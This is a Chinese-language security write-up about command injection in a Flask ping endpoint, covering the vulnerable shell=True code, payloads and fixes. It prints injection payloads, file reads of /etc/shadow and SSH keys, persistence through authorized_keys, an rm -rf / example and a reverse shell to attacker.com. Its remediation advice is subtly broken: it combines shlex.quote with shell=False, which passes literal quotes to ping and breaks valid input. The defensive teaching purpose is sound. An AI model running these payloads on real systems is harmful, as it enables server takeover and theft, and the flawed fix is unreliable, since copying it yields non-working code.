## 1. 漏洞概述

### 1.1 什么是命令注入

**命令注入（Command Injection）** 是一种攻击方式，攻击者通过在应用程序的输入字段中插入操作系统命令，**利用应用程序对用户输入的不当处理，使服务器执行非预期的系统命令**。

### 1.2 命令注入的危害

| 危害类型 | 示例 | 严重程度 |
|:---------|:-----|:--------:|
| 🔴 **服务器完全控制** | 反弹 Shell | **灾难性** |
| 🔴 **敏感文件泄露** | `cat /etc/shadow` | **灾难性** |
| 🔴 **数据篡改/删除** | `rm -rf /` | **灾难性** |
| 🔴 **植入后门** | 写入 SSH 密钥 | **灾难性** |
| 🔴 **内网横向移动** | 扫描内网其他主机 | **严重** |

### 1.3 命令注入 vs SSRF

| 对比维度 | 命令注入 | SSRF |
|:---------|:---------|:------|
| **执行方式** | 直接在服务器上执行系统命令 | 通过服务器发起网络请求 |
| **攻击目标** | 服务器操作系统 | 内网/外部服务 |
| **危害** | 直接控制服务器 | 内网探测与数据读取 |

### 1.4 本次发现漏洞总览

| 编号 | 攻击手法 | 注入点 | 风险等级 | 状态 |
|:----:|:---------|:------:|:--------:|:----:|
| **CI-01** | `;` 分号注入 | `ip;id` | 🔴 严重 | ✅ 已修复 |
| **CI-02** | `|` 管道符注入 | `ip|whoami` | 🔴 严重 | ✅ 已修复 |
| **CI-03** | `&&` 逻辑与注入 | `ip&&whoami` | 🔴 严重 | ✅ 已修复 |
| **CI-04** | `||` 逻辑或注入 | `nonexist||id` | 🔴 严重 | ✅ 已修复 |
| **CI-05** | 任意文件读取 | `ip;cat /etc/passwd` | 🔴 灾难性 | ✅ 已修复 |

## 2. 命令注入原理

### 2.1 命令注入的攻击原理

```
┌────────────────────────────────────────────────────────────┐
│                                                            │
│  正常请求:                                                  │
│    POST /ping  ip=8.8.8.8                                  │
│    → 执行的命令: ping -c 3 8.8.8.8                     ✅  │
│                                                            │
│  攻击请求（分号注入）:                                        │
│    POST /ping  ip=8.8.8.8;id                               │
│    → 执行的命令: ping -c 3 8.8.8.8;id                      │
│                   ↑              ↑                         │
│               正常命令      注入的命令，被 shell 执行！ ❌    │
│                                                            │
│  攻击请求（管道符注入）:                                      │
│    POST /ping  ip=8.8.8.8|whoami                            │
│    → 执行的命令: ping -c 3 8.8.8.8|whoami                   │
│                   ↑              ↑                          │
│               ping 输出被      whoami 的结果                 │
│               管道传给 whoami   作为最终输出 ❌               │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 2.2 漏洞代码分析

**漏洞代码（修复前）**：

```python
@app.route("/ping", methods=["GET", "POST"])
def ping():
    if request.method == "POST":
        ip = request.form.get("ip", "")

        # ❌ 问题1：使用 f-string 拼接用户输入到命令
        command = f"ping -c 3 {ip}"

        # ❌ 问题2：使用 shell=True
        #    shell 会解析命令字符串中的特殊字符
        #    ; | && || $() `` 都会被 shell 解释执行
        output = subprocess.check_output(command, shell=True, timeout=30)

        result = output.decode("utf-8", errors="replace")
        return render_template("ping.html", result=result, ip=ip)
```

**两个致命错误**：

| 问题 | 说明 |
|:-----|:------|
| **① f-string 拼接** | 用户输入直接嵌入命令字符串，攻击者可以插入任意 shell 元字符 |
| **② shell=True** | 命令通过 `/bin/sh` 执行，shell 会解析 `;`、`|`、`&&` 等特殊字符 |

### 2.3 shell=True 的危害

```python
# shell=False（安全）—— 参数直接传给程序，shell 不介入
subprocess.check_output(["ping", "-c", "3", "8.8.8.8;id"], shell=False)
# 实际执行: ping -c 3 "8.8.8.8;id"
# → ping 尝试 ping 一个叫 "8.8.8.8;id" 的主机名
# → 分号和 id 被当作普通字符，不会被 shell 解析 ✅

# shell=True（危险）—— 通过 /bin/sh 执行字符串
subprocess.check_output("ping -c 3 8.8.8.8;id", shell=True)
# 实际执行:
#   1. /bin/sh -c "ping -c 3 8.8.8.8;id"
#   2. shell 解析字符串，; 分隔两条命令
#   3. 执行: ping -c 3 8.8.8.8
#   4. 执行: id          ← 注入成功！❌
```

## 3. 漏洞详情与复现

### 3.1 CI-01：分号注入

**攻击向量**：使用分号 `;` 分隔多条命令。

```bash
# 攻击请求
POST /ping
ip=127.0.0.1;id

# 实际执行的命令
/bin/sh -c "ping -c 3 127.0.0.1;id"
                                 ↑
                         分号分隔两条命令

# 输出:
# PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
# 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015ms
# ...
# uid=0(root) gid=0(root) groups=0(root)      ← id 命令结果！
```

### 3.2 CI-02：管道符注入

**攻击向量**：使用管道符 `|` 将命令输出重定向。

```bash
POST /ping
ip=127.0.0.1|whoami

# 实际执行: ping -c 3 127.0.0.1|whoami
# ping 的输出被管道传给 whoami
# 最终输出只有: root
```

### 3.3 CI-03：逻辑与注入

**攻击向量**：使用 `&&` 让两条命令都执行。

```bash
POST /ping
ip=127.0.0.1&&whoami

# 实际执行: ping -c 3 127.0.0.1&&whoami
# 首先执行 ping，成功后执行 whoami
```

### 3.4 CI-04：逻辑或注入

**攻击向量**：使用 `||` 在命令失败时执行注入命令。

```bash
POST /ping
ip=nonexist||id

# 实际执行: ping -c 3 nonexist||id
# ping 失败后，执行 id 命令
```

### 3.5 CI-05：任意文件读取

**攻击向量**：利用命令注入读取系统敏感文件。

```bash
POST /ping
ip=127.0.0.1;cat /etc/passwd

# 输出中包含 /etc/passwd 文件内容
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...
```

## 4. 攻击场景模拟

### 4.1 完整的命令注入攻击链

```
信息收集:
  POST /ping  ip=127.0.0.1;id                   → 获取当前用户 (root)
  POST /ping  ip=127.0.0.1;pwd                   → 获取当前目录
  POST /ping  ip=127.0.0.1;ls -la /opt           → 列出项目文件

权限提升:
  POST /ping  ip=127.0.0.1;cat /etc/shadow       → 获取密码哈希（root）
  POST /ping  ip=127.0.0.1;cat /root/.ssh/id_rsa → 获取 SSH 私钥

持久化控制:
  POST /ping  ip=127.0.0.1;echo "hacker" >> /etc/passwd  → 创建系统用户
  POST /ping  ip=127.0.0.1;echo "ssh-rsa AAA..." >> /root/.ssh/authorized_keys
  → 写入 SSH 公钥，获取永久访问权限

反弹 Shell:
  POST /ping  ip=127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1
  → 攻击者获得交互式 shell
```

## 5. 修复方案详解

### 5.1 防御一：使用 shell=False

**原理**：当 `shell=False` 时，`subprocess` 不会调用 `/bin/sh` 来解释命令字符串，而是直接将参数列表传递给操作系统。所有特殊字符（`;`、`|`、`&&` 等）被当作普通字符传递给程序。

```python
# ❌ 危险：shell=True 通过 shell 执行
command = f"ping -c 3 {ip}"
output = subprocess.check_output(command, shell=True)

# ✅ 安全：shell=False，参数列表直接传递
command = ["ping", "-c", "3", ip]
output = subprocess.check_output(command, shell=False)
```

**为什么 shell=False 是安全的？**

```
shell=True 的情况:
  Python → "/bin/sh -c 'ping -c 3 8.8.8.8;id'"
           → shell 解析字符串 → 发现分号 → 执行两条命令！

shell=False 的情况:
  Python → exec("ping", "-c", "3", "8.8.8.8;id")
           → 系统调用 execve → ping 程序收到参数 "8.8.8.8;id"
           → ping 程序: "这是主机名？8.8.8.8;id？不认识，报错"
           → 分号没有被 shell 解析，只是普通字符
```

### 5.2 防御二：参数列表模式

**原理**：将命令和参数以列表形式传递，而不是拼接成字符串。这样可以确保每个参数的边界清晰。

```python
# ❌ 字符串拼接（危险）
command = f"ping -c 3 {ip}"
# → 用户输入 "8.8.8.8;id" 会变成:
#   "ping -c 3 8.8.8.8;id"
#   shell 将其解析为两条命令

# ✅ 参数列表（安全）
command = ["ping", "-c", "3", ip]
# → 用户输入 "8.8.8.8;id" 会变成:
#   ["ping", "-c", "3", "8.8.8.8;id"]
#   ping 收到一个参数: "8.8.8.8;id" （整个字符串）
#   分号不会被 shell 解析
```

### 5.3 防御三：shlex.quote 转义

**原理**：`shlex.quote()` 函数会用单引号包裹字符串，并对字符串中的单引号进行转义，确保 shell 将其视为一个字面量。

```python
import shlex

user_input = "8.8.8.8;id"
safe = shlex.quote(user_input)
# → "'8.8.8.8;id'"  （单引号包裹）

# shell 会将单引号内的所有字符视为字面量
# 分号和 id 不会被解析为命令
```

### 5.4 修复前后代码对比

| 维度 | ❌ 修复前 | ✅ 修复后 |
|:----:|:---------|:----------|
| **命令格式** | `f"ping -c 3 {ip}"` 字符串 | `["ping", "-c", "3", safe_ip]` 列表 |
| **shell 参数** | `shell=True` | `shell=False` |
| **参数转义** | 无 | `shlex.quote(ip)` |
| **用户输入角色** | **代码** — shell 解析为命令 | **数据** — 作为 ping 程序参数 |
| **面对 `;id`** | ✅ 执行 id 命令 | ❌ ping 收到无效主机名 |
| **面对 `|whoami`** | ✅ 执行 whoami | ❌ 管道符被当作主机名字符 |
| **面对 `&&whoami`** | ✅ 执行 whoami | ❌ && 被当作主机名字符 |

### 5.5 完整防御流程图

```
用户输入: 8.8.8.8;id
  │
  ├─ shlex.quote("8.8.8.8;id")
  │   → "'8.8.8.8;id'"
  │
  ├─ command = ["ping", "-c", "3", "'8.8.8.8;id'"]
  │
  ├─ subprocess.check_output(command, shell=False)
  │   → exec("ping", "-c", "3", "'8.8.8.8;id'")
  │
  └─ ping 程序收到参数: "'8.8.8.8;id'"
      → "这是个什么主机名？查不到，报错"
      → ✅ 注入失败！
```

### 6.3 防御机制详解

```
三种防御措施的协同工作:

1. shlex.quote() 转义
   "8.8.8.8;id" → "'8.8.8.8;id'"
   → 整个字符串被单引号包裹，shell 无法解析特殊字符

2. 参数列表模式
   ["ping", "-c", "3", "'8.8.8.8;id'"]
   → 每个参数边界清晰，不会被 shell 分割

3. shell=False
   → 不经过 /bin/sh，直接执行系统调用
   → 特殊字符不会被 shell 解释
```

## 7. 安全加固总结

### 7.1 命令执行安全黄金法则

```
┌──────────────────────────────────────────────────────────┐
│            🥇 命令执行安全黄金法则                         │
│                                                          │
│   1. 永远使用 shell=False                                 │
│   2. 永远使用参数列表（不用字符串）                          │
│   3. 永远使用 shlex.quote 转义外部输入                     │
│   4. 不要用 f-string 拼接系统命令                          │
│   5. 最小权限原则（不必要以 root 运行）                     │
│   6. 限制命令执行超时                                     │
│                                                          │
│     "Don't let user input become shell commands."         │
│      别让用户输入变成 shell 命令。                          │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### 7.2 不同执行方式的对比

| 执行方式 | 示例 | 防御效果 | 推荐 |
|:---------|:-----|:--------:|:----:|
| `subprocess.run(list, shell=False)` | `["ping", ip]` | ⭐⭐⭐⭐⭐ 彻底防御 | 🥇 **首选** |
| `subprocess.run(str, shell=False)` | 不支持 | — | ❌ 不可行 |
| `subprocess.run(str, shell=True)` + shlex.quote | `f"ping {shlex.quote(ip)}"` | ⭐⭐⭐ 较好但仍有风险 | 🥉 备选 |
| `os.system(f"ping {ip}")` | `os.system(cmd)` | ⭐ 极易注入 | ❌ **拒绝** |
| `subprocess.run(str, shell=True)` | `f"ping {ip}"` | ❌ 完全无防护 | ❌ **拒绝** |
